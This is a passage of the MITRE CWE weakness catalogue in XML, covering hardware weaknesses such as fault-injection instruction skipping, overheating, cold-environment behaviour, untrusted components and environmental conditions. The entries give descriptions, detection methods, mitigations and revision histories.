			    <Description>This weakness can be found using automated dynamic analysis. Both emulation of a CPU with instruction skips, as well as RTL simulation of a CPU IP, can indicate parts of the code that are sensitive to faults due to instruction skips.</Description>
			    <Effectiveness>Moderate</Effectiveness>
			  </Detection_Method>
			  <Detection_Method>
			    <Method>Manual Analysis</Method>
			    <Description>This weakness can be found using manual (static) analysis. The analyst has security objectives that are matched against the high-level code. This method is less precise than emulation, especially if the analysis is done at the higher level language rather than at assembly level.</Description>
			    <Effectiveness>Moderate</Effectiveness>
			  </Detection_Method>
			</Detection_Methods>
			<Potential_Mitigations>
				<Mitigation>
					<Phase>Architecture and Design</Phase>
                    <Description>Design strategies for ensuring safe failure if
                        inputs, such as Vcc, are modified out of acceptable
                        ranges.</Description>
				</Mitigation>
				<Mitigation>
					<Phase>Architecture and Design</Phase>
                    <Description>Design strategies for ensuring safe behavior if
                        instructions attempt to be skipped.</Description>
				</Mitigation>
                <Mitigation>
                      <Phase>Architecture and Design</Phase>
                      <Description>Identify mission critical secrets that should
                          be wiped if faulting is detected, and design a
                          mechanism to do the deletion.</Description>
                </Mitigation>
                <Mitigation>
                      <Phase>Implementation</Phase>
                      <Description>Add redundancy by performing an operation
                          multiple times, either in space or time, and perform
                          majority voting. Additionally, make conditional
                          instruction timing unpredictable.</Description>
                </Mitigation>
                <Mitigation>
                      <Phase>Implementation</Phase>
                      <Description>Use redundant operations or canaries to
                          detect and respond to faults.</Description>
                </Mitigation>
                <Mitigation>
                    <Phase>Implementation</Phase>
                    <Description>Ensure that fault mitigations are strong enough
                        in practice. For example, a low power detection
                        mechanism that takes 50 clock cycles to trigger at lower
                        voltages may be an insufficient security mechanism if
                        the instruction counter has already progressed with no
                        other CPU activity occurring.</Description>
                </Mitigation>
			</Potential_Mitigations>
			<Demonstrative_Examples>
			  <Demonstrative_Example>
			    <Intro_Text>A smart card contains authentication credentials that are used as authorization to enter a building. The credentials are only accessible when a correct PIN is presented to the card.</Intro_Text>
			    <Example_Code Nature="Bad">
			      The card emits the credentials when a voltage anomaly is injected into the power line to the device at a particular time after providing an incorrect PIN to the card, causing the internal program to accept the incorrect PIN.</Example_Code>
			    <Body_Text>There are several ways this weakness could be fixed.</Body_Text>
			    <Example_Code Nature="Good"><xhtml:ul>
			      <xhtml:li>add an internal filter or internal power supply in series with the power supply pin on the device</xhtml:li>
			      <xhtml:li>add sensing circuitry to reset the device if out of tolerance conditions are detected</xhtml:li>
			      <xhtml:li>add additional execution sensing circuits to monitor the execution order for anomalies and abort the action or reset the device under fault conditions</xhtml:li>
			      </xhtml:ul>
			    </Example_Code>
			  </Demonstrative_Example>
			</Demonstrative_Examples>
			<Observed_Examples>
			  <Observed_Example>
				<Reference>CVE-2019-15894</Reference>
				<Description>fault injection attack bypasses the verification mode, potentially allowing arbitrary code execution.</Description>
				<Link>https://www.cve.org/CVERecord?id=CVE-2019-15894</Link>
			  </Observed_Example>
			</Observed_Examples>
			<Functional_Areas>
            	<Functional_Area>Power</Functional_Area>
         	</Functional_Areas>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="624"/>
            <Related_Attack_Pattern CAPEC_ID="625"/>
         </Related_Attack_Patterns>
         <References>
                <Reference External_Reference_ID="REF-1161"/>
		<Reference External_Reference_ID="REF-1222"/>
		<Reference External_Reference_ID="REF-1223"/>
		<Reference External_Reference_ID="REF-1224"/>
		<Reference External_Reference_ID="REF-1286" Section="4.3"/>
            </References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
			<Content_History>
				<Submission>
					<Submission_Name>Jasper van Woudenberg</Submission_Name>
					<Submission_Organization>Riscure</Submission_Organization>
					<Submission_Date>2020-10-14</Submission_Date>
					<Submission_Version>4.3</Submission_Version>
					<Submission_ReleaseDate>2020-12-10</Submission_ReleaseDate>
				</Submission>
                <Modification>
					<Modification_Name>Jasper van Woudenberg</Modification_Name>
					<Modification_Organization>Riscure</Modification_Organization>
					<Modification_Date>2021-01-11</Modification_Date>
                </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Description, Functional_Areas, Potential_Mitigations, References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Description, Detection_Factors, Maintenance_Notes, Name, Observed_Examples, Potential_Mitigations, References, Relationships, Weakness_Ordinalities</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Contribution Type="Content">
				  <Contribution_Name>Jasper van Woudenberg</Contribution_Name>
				  <Contribution_Organization>Riscure</Contribution_Organization>
				  <Contribution_Date>2021-10-11</Contribution_Date>
				  <Contribution_Comment>Provided detection methods and feedback on demonstrative example</Contribution_Comment>
				</Contribution>
			<Previous_Entry_Name Date="2021-10-28">Insufficient Protection Against Instruction Skipping Via Fault Injection</Previous_Entry_Name>
			</Content_History>
		</Weakness>
      <Weakness ID="1338" Name="Improper Protections Against Hardware Overheating" Abstraction="Base" Structure="Simple" Status="Draft">
			<Description>A hardware device is missing or has inadequate protection features to prevent overheating.</Description>
			<Extended_Description>
				<xhtml:p>Hardware, electrical circuits, and semiconductor silicon have thermal side effects, such that some of the energy consumed by the device gets dissipated as heat and increases the temperature of the device. For example, in semiconductors, higher-operating frequency of silicon results in higher power dissipation and heat. The leakage current in CMOS circuits increases with temperature, and this creates positive feedback that can result in thermal runaway and damage the device permanently.</xhtml:p>
				<xhtml:p>Any device lacking protections such as thermal sensors, adequate platform cooling, or thermal insulation is susceptible to attacks by malicious software that might deliberately operate the device in modes that result in overheating. This can be used as an effective denial of service (DoS) or permanent denial of service (PDoS) attack.</xhtml:p>
				<xhtml:p>Depending on the type of hardware device and its expected usage, such thermal overheating can also cause safety hazards and reliability issues. Note that battery failures can also cause device overheating but the mitigations and examples included in this submission cannot reliably protect against a battery failure. </xhtml:p>
				<xhtml:p>There can be similar weaknesses with lack of protection from attacks based on overvoltage or overcurrent conditions. However, thermal heat is generated by hardware operation and the device should implement protection from overheating.</xhtml:p>
			</Extended_Description>
			<Related_Weaknesses>
				<Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
			</Related_Weaknesses>
			<Applicable_Platforms>	
				<Language Class="Not Language-Specific" Prevalence="Undetermined"/>
				<Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
				<Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
				<Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
				<Technology Class="ICS/OT" Prevalence="Undetermined"/>
				<Technology Name="Power Management Hardware" Prevalence="Undetermined"/>
				<Technology Name="Processor Hardware" Prevalence="Undetermined"/>
			</Applicable_Platforms>
			<Modes_Of_Introduction>
				<Introduction>
					<Phase>Architecture and Design</Phase>
				</Introduction>
				<Introduction>
					<Phase>Implementation</Phase>
					<Note>Such issues could be introduced during hardware architecture, design or implementation.</Note>
				</Introduction>
			</Modes_Of_Introduction>
			<Common_Consequences>
				<Consequence>
					<Scope>Availability</Scope>
					<Impact>DoS: Resource Consumption (Other)</Impact>
					<Likelihood>High</Likelihood>
				</Consequence>
			</Common_Consequences>
			<Detection_Methods>
				<Detection_Method>
				<Method>Dynamic Analysis with Manual Results Interpretation</Method>
				<Description>Dynamic tests should be performed to stress-test temperature controls.</Description>
				<Effectiveness>High</Effectiveness>
				</Detection_Method>
				<Detection_Method>
				<Method>Architecture or Design Review</Method>
				<Description>Power management controls should be part of Architecture and Design reviews.</Description>
				<Effectiveness>High</Effectiveness>
				</Detection_Method>
			</Detection_Methods>
			<Potential_Mitigations>
				<Mitigation>
					<Phase>Architecture and Design</Phase>
					<Description>Temperature maximum and minimum limits should be enforced using thermal sensors both in silicon and at the platform level.</Description>
				</Mitigation>
				<Mitigation>
					<Phase>Implementation</Phase>
					<Description>The platform should support cooling solutions such as fans that can be modulated based on device-operation needs to maintain a stable temperature.</Description>
				</Mitigation>
			</Potential_Mitigations>
			<Demonstrative_Examples>
				<Demonstrative_Example>
					<Intro_Text>Malicious software running on a core can execute instructions that consume maximum power or increase core frequency. Such a power-virus program could execute on the platform for an extended time to overheat the device, resulting in permanent damage.</Intro_Text>
					<Body_Text>Execution core and platform do not support thermal sensors, performance throttling, or platform-cooling countermeasures to ensure that any software executing on the system cannot cause overheating past the maximum allowable temperature.</Body_Text>
					<Body_Text>The platform and SoC should have failsafe thermal limits that are enforced by thermal sensors that trigger critical temperature alerts when high temperature is detected. Upon detection of high temperatures, the platform should trigger cooling or shutdown automatically.</Body_Text>
				</Demonstrative_Example>
			</Demonstrative_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="624"/>
            <Related_Attack_Pattern CAPEC_ID="625"/>
         </Related_Attack_Patterns>
         <References>
				<Reference External_Reference_ID="REF-1156"/>
			</References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
			<Content_History>
				<Submission>
					<Submission_Name>Arun Kanuparthi, Hareesh Khattri, Parbati Kumar Manna</Submission_Name>
					<Submission_Organization>Intel Corporation</Submission_Organization>
					<Submission_Date>2020-05-29</Submission_Date>
					<Submission_Version>4.3</Submission_Version>
					<Submission_ReleaseDate>2020-12-10</Submission_ReleaseDate>
				</Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
			</Content_History>
		</Weakness>
      <Weakness ID="1351" Name="Improper Handling of Hardware Behavior in Exceptionally Cold Environments" Abstraction="Base" Structure="Simple" Status="Incomplete">
            <Description>A hardware device, or the firmware running on it, is
                missing or has incorrect protection features to maintain
                goals of security primitives when the device is cooled below
                standard operating temperatures.</Description>
			<Extended_Description>
                <xhtml:p>The hardware designer may improperly anticipate
                    hardware behavior when exposed to exceptionally cold
                    conditions. As a result they may introduce a weakness by not
                    accounting for the modified behavior of critical components
                    when in extreme environments.</xhtml:p>
                <xhtml:p>An example of a change in behavior is that power loss
                    won't clear/reset any volatile state when cooled below
                    standard operating temperatures. This may result in
                    a weakness when the starting state of the volatile memory is
                    being relied upon for a security decision. For example, a
                    Physical Unclonable Function (PUF) may be supplied as a
                    security primitive to improve confidentiality,
                    authenticity, and integrity guarantees. However, when the
                    PUF is paired with DRAM, SRAM, or another temperature
                    sensitive entropy source, the system designer may introduce
                    weakness by failing to account for the chosen entropy
                    source's behavior at exceptionally low temperatures. In the
                    case of DRAM and SRAM, when power is cycled at low
                    temperatures, the device will not contain the bitwise
                    biasing caused by inconsistencies in manufacturing and will
                    instead contain the data from previous boot. Should the PUF
                    primitive be used in a cryptographic construction which
                    does not account for full adversary control of PUF seed
                    data, weakness would arise.</xhtml:p>
                <xhtml:p>This weakness does not cover "Cold Boot Attacks"
                    wherein RAM or other external storage is super cooled and
                    read externally by an attacker.</xhtml:p>
			</Extended_Description>
			<Related_Weaknesses>
              <Related_Weakness Nature="ChildOf" CWE_ID="1384" View_ID="1000" Ordinal="Primary"/>
			</Related_Weaknesses>
			<Applicable_Platforms>
				<Language Class="Not Language-Specific" Prevalence="Undetermined"/>
				<Operating_System Class="Not OS-Specific" Prevalence="Undetermined"/>
				<Architecture Class="Embedded" Prevalence="Undetermined"/>
				<Architecture Class="Microcomputer" Prevalence="Undetermined"/>
				<Technology Class="System on Chip" Prevalence="Undetermined"/>
            </Applicable_Platforms>
			<Modes_Of_Introduction>
				<Introduction>
					<Phase>Architecture and Design</Phase>
				</Introduction>
				<Introduction>
					<Phase>Implementation</Phase>
				</Introduction>
			</Modes_Of_Introduction>
			<Common_Consequences>
				<Consequence>
					<Scope>Integrity</Scope>
					<Scope>Authentication</Scope>
					<Impact>Varies by Context</Impact>
					<Impact>Unexpected State</Impact>
					<Likelihood>Low</Likelihood>
					<Note>Consequences of this weakness are highly contextual.</Note>
				</Consequence>
			</Common_Consequences>
			<Potential_Mitigations>
				<Mitigation>
					<Phase>Architecture and Design</Phase>
					<Description>The system should account for security primitive behavior when cooled outside standard temperatures.</Description>
				</Mitigation>
			</Potential_Mitigations>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="624"/>
            <Related_Attack_Pattern CAPEC_ID="625"/>
         </Related_Attack_Patterns>
         <References>
				<Reference External_Reference_ID="REF-1181"/>
				<Reference External_Reference_ID="REF-1182"/>
				<Reference External_Reference_ID="REF-1183"/>
			</References>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
			<Content_History>
				<Submission>
					<Submission_Name>Paul A. Wortman</Submission_Name>
					<Submission_Organization>Wells Fargo</Submission_Organization>
					<Submission_Date>2020-10-23</Submission_Date>
					<Submission_Version>4.5</Submission_Version>
					<Submission_ReleaseDate>2021-07-20</Submission_ReleaseDate>
				</Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
			</Content_History>
		</Weakness>
      <Weakness ID="1357" Name="Reliance on Insufficiently Trustworthy Component" Abstraction="Class" Structure="Simple" Status="Incomplete">
      <Description>The product is built from multiple separate components, but it uses a component that is not sufficiently trusted to meet expectations for security, reliability, updateability, and maintainability.</Description>
      <Extended_Description>
		<xhtml:p>Many modern hardware and software products are built by combining multiple smaller components together into one larger entity, often during the design or architecture phase. For example, a hardware component might be built by a separate supplier, or the product might use an open-source software library from a third party.</xhtml:p>
		<xhtml:p>Regardless of the source, each component should be sufficiently trusted to ensure correct, secure operation of the product. If a component is not trustworthy, it can produce significant risks for the overall product, such as vulnerabilities that cannot be patched fast enough (if at all); hidden functionality such as malware; inability to update or replace the component if needed for security purposes; hardware components built from parts that do not meet specifications in ways that can lead to weaknesses; etc. Note that a component might not be trustworthy even if it is owned by the product vendor, such as a software component whose source code is lost and was built by developers who left the company, or a component that was developed by a separate company that was acquired and brought into the product's own company.</xhtml:p>
		<xhtml:p>Note that there can be disagreement as to whether a component is sufficiently trustworthy, since trust is ultimately subjective. Different stakeholders (e.g., customers, vendors, governments) have various threat models and ways to assess trust, and design/architecture choices might make tradeoffs between security, reliability, safety, privacy, cost, and other characteristics.</xhtml:p>
      </Extended_Description>
    <Related_Weaknesses>
      <Related_Weakness Nature="ChildOf" CWE_ID="710" View_ID="1000" Ordinal="Primary"/>
    </Related_Weaknesses>
    <Weakness_Ordinalities>
      <Weakness_Ordinality>
	<Ordinality>Indirect</Ordinality>
      </Weakness_Ordinality>
    </Weakness_Ordinalities>
    <Applicable_Platforms>
      <Architecture Class="Not Architecture-Specific" Prevalence="Undetermined"/>
      <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
	  <Technology Class="ICS/OT" Prevalence="Undetermined"/>
    </Applicable_Platforms>
    <Modes_Of_Introduction>
      <Introduction>
		<Phase>Requirements</Phase>
		<Note>Requirements might include criteria for which the only available solutions are provided by insufficiently trusted components.</Note>
      </Introduction>
      <Introduction>
		<Phase>Architecture and Design</Phase>
		<Note>An insufficiently trusted component might be selected because it is less expensive to do in-house, requires expertise that is not available in-house, or might allow the product to reach the market faster.</Note>
      </Introduction>
    </Modes_Of_Introduction>
    <Common_Consequences>
      <Consequence>
	<Scope>Other</Scope>
	<Impact>Reduce Maintainability</Impact>
      </Consequence>
    </Common_Consequences>
    <Potential_Mitigations>
	  <Mitigation>
		<Phase>Requirements</Phase>
		<Phase>Architecture and Design</Phase>
		<Phase>Implementation</Phase>
		<Description>For each component, ensure that its supply chain is well-controlled with sub-tier suppliers using best practices. For third-party software components such as libraries, ensure that they are developed and actively maintained by reputable vendors.</Description>
	  </Mitigation>
      <Mitigation>
	<Phase>Architecture and Design</Phase>
	<Phase>Implementation</Phase>
	<Phase>Integration</Phase>
	<Phase>Manufacturing</Phase>
	<Description>Maintain a Bill of Materials for all components and sub-components of the product. For software, maintain a Software Bill of Materials (SBOM). According to [REF-1247], "An SBOM is a formal, machine-readable inventory of software components and dependencies, information about those components, and their hierarchical relationships."</Description>
      </Mitigation>
      <Mitigation>
	<Phase>Operation</Phase>
	<Phase>Patching and Maintenance</Phase>
	<Description>Continue to monitor changes in each of the product's components, especially when the changes indicate new vulnerabilities, end-of-life (EOL) plans, supplier practices that affect trustworthiness, etc.</Description>
      </Mitigation>
    </Potential_Mitigations>
    <Observed_Examples>
      <Observed_Example>
        <Reference>CVE-2020-9054</Reference>
        <Description>Chain: network-attached storage (NAS) device has a critical OS command injection (CWE-78) vulnerability that is actively exploited to place IoT devices into a botnet, but some products are "end-of-support" and cannot be patched (CWE-1277). [REF-1097]</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2020-9054</Link>
      </Observed_Example>
    </Observed_Examples>
	<Taxonomy_Mappings>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 2-4</Entry_ID>
		<Entry_Name>Req SP.03.02 RE(1)</Entry_Name>
	  </Taxonomy_Mapping>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 2-4</Entry_ID>
		<Entry_Name>Req SP.03.02 RE(2)</Entry_Name>
	  </Taxonomy_Mapping>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 3-3</Entry_ID>
		<Entry_Name>Req SR 1.13</Entry_Name>
	  </Taxonomy_Mapping>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 4-2</Entry_ID>
		<Entry_Name>Req EDR 3.12</Entry_Name>
	  </Taxonomy_Mapping>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 4-2</Entry_ID>
		<Entry_Name>Req HDR 3.12</Entry_Name>
	  </Taxonomy_Mapping>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 4-2</Entry_ID>
		<Entry_Name>Req NDR 3.12</Entry_Name>
	  </Taxonomy_Mapping>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 4-2</Entry_ID>
		<Entry_Name>Req EDR 3.13</Entry_Name>
	  </Taxonomy_Mapping>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 4-2</Entry_ID>
		<Entry_Name>Req HDR 3.13</Entry_Name>
	  </Taxonomy_Mapping>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 4-2</Entry_ID>
		<Entry_Name>Req NDR 3.13</Entry_Name>
	  </Taxonomy_Mapping>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 4-2</Entry_ID>
		<Entry_Name>Req CR-7.8</Entry_Name>
	  </Taxonomy_Mapping>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 4-1</Entry_ID>
		<Entry_Name>Req SM-6</Entry_Name>
	  </Taxonomy_Mapping>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 4-1</Entry_ID>
		<Entry_Name>Req SM-9</Entry_Name>
	  </Taxonomy_Mapping>
	  <Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
		<Entry_ID>Part 4-1</Entry_ID>
		<Entry_Name>Req SM-10</Entry_Name>
	  </Taxonomy_Mapping>
	</Taxonomy_Mappings>
    <References>
      <Reference External_Reference_ID="REF-1212"/>
      <Reference External_Reference_ID="REF-1246"/>
      <Reference External_Reference_ID="REF-1247"/>
      <Reference External_Reference_ID="REF-1097"/>
    </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
    <Notes>
	  <Note Type="Maintenance">As of CWE 4.10, the name and description for this entry has undergone significant change and is still under public discussion, especially by members of the HW SIG.</Note>
    </Notes>
    <Content_History>
      <Submission>
	<Submission_Name>CWE Content Team</Submission_Name>
	<Submission_Organization>MITRE</Submission_Organization>
	<Submission_Date>2022-04-20</Submission_Date>
	<Submission_Version>4.7</Submission_Version>
	<Submission_ReleaseDate>2022-04-28</Submission_ReleaseDate>
      </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Maintenance_Notes, Modes_of_Introduction, Name, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Contribution Type="Content">
				  <Contribution_Name>"Mapping CWE to 62443" Sub-Working Group</Contribution_Name>
				  <Contribution_Organization>CWE-CAPEC ICS/OT SIG</Contribution_Organization>
				  <Contribution_Date>2023-06-29</Contribution_Date>
				  <Contribution_Version>4.12</Contribution_Version>
				  <Contribution_ReleaseDate>2023-06-29</Contribution_ReleaseDate>
				  <Contribution_Comment>Suggested mappings to ISA/IEC 62443.</Contribution_Comment>
				</Contribution>
			<Previous_Entry_Name Date="2023-01-31">Reliance on Uncontrolled Component</Previous_Entry_Name>
    </Content_History>
  </Weakness>
      <Weakness ID="1384" Name="Improper Handling of Physical or Environmental Conditions" Abstraction="Class" Structure="Simple" Status="Incomplete">
    <Description>The product does not properly handle unexpected physical or environmental conditions that occur naturally or are artificially induced.</Description>
    <Extended_Description>
      <xhtml:p>Hardware products are typically only guaranteed to behave correctly within certain physical limits or environmental conditions. Such products cannot necessarily control the physical or external conditions to which they are subjected. However, the inability to handle such conditions can undermine a product's security. For example, an unexpected physical or environmental condition may cause the flipping of a bit that is used for an authentication decision. This unexpected condition could occur naturally or be induced artificially by an adversary.</xhtml:p>
      <xhtml:p>Physical or environmental conditions of concern are:</xhtml:p>
      <xhtml:ul>
        <xhtml:li>
          <xhtml:div><xhtml:b>Atmospheric characteristics: </xhtml:b>extreme temperature ranges, etc.</xhtml:div>
        </xhtml:li>
        <xhtml:li>
          <xhtml:div><xhtml:b>Interference: </xhtml:b>electromagnetic interference (EMI), radio frequency interference (RFI), etc.</xhtml:div>
        </xhtml:li>
        <xhtml:li>
          <xhtml:div><xhtml:b>Assorted light sources: </xhtml:b>white light, ultra-violet light (UV), lasers, infrared (IR), etc.</xhtml:div>
        </xhtml:li>
        <xhtml:li>
          <xhtml:div><xhtml:b>Power variances: </xhtml:b>under-voltages, over-voltages, under-current, over-current, etc.</xhtml:div>
        </xhtml:li>
        <xhtml:li>
          <xhtml:div><xhtml:b>Clock variances: </xhtml:b>glitching, overclocking, clock stretching, etc.</xhtml:div>
        </xhtml:li>
        <xhtml:li>
          <xhtml:div><xhtml:b>Component aging and degradation</xhtml:b></xhtml:div>
        </xhtml:li>
        <xhtml:li>
          <xhtml:div><xhtml:b>Materials manipulation: </xhtml:b>focused ion beams (FIB), etc.</xhtml:div>
        </xhtml:li>
        <xhtml:li>
          <xhtml:div><xhtml:b>Exposure to radiation: </xhtml:b>x-rays, cosmic radiation, etc.</xhtml:div>
        </xhtml:li>
      </xhtml:ul>
    </Extended_Description>
    <Related_Weaknesses>
      <Related_Weakness Nature="ChildOf" CWE_ID="703" View_ID="1000" Ordinal="Primary"/>
    </Related_Weaknesses>
    <Applicable_Platforms>
      <Technology Class="System on Chip" Prevalence="Undetermined"/>
	  <Technology Class="ICS/OT" Prevalence="Undetermined"/>
    </Applicable_Platforms>
    <Modes_Of_Introduction>
      <Introduction>
	<Phase>Architecture and Design</Phase>
	<Note>The product's design might not consider checking and handling extreme conditions.</Note>
      </Introduction>
      <Introduction>
	<Phase>Manufacturing</Phase>
	<Note>For hardware manufacturing, sub-par components might be chosen that are not able to handle the expected environmental conditions.</Note>
      </Introduction>
    </Modes_Of_Introduction>
    <Common_Consequences>
      <Consequence>
